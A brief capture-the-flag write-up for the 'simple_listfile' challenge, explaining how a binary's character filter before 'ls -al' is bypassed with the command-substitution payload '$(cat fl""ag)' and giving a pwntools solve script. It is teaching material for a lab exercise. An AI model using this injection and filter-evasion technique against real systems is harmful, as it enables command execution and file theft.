# PoC HackingCamp 16th Pwnable simple_listfile

## Binary Analysis

![main](main.PNG)

This binary read input and filter some characters and execute them with the `ls -al`.

![filter](filter.PNG)

The characters that it filters are `;` ,``` ` ```, `|` , `*` , `&` , `\` , `?` , `>` , `<` , `'` , `\n`, and `flag`.

But, it doesn't filter `$` , `(` , `)` and `"`.

I used them like this.

`$(cat fl""ag)`

## Solve Code

```python
from pwn import *

p = process("./simple_listfile")
p.sendlineafter(": ", "$(cat fl\"\"ag)")

p.interactive()
```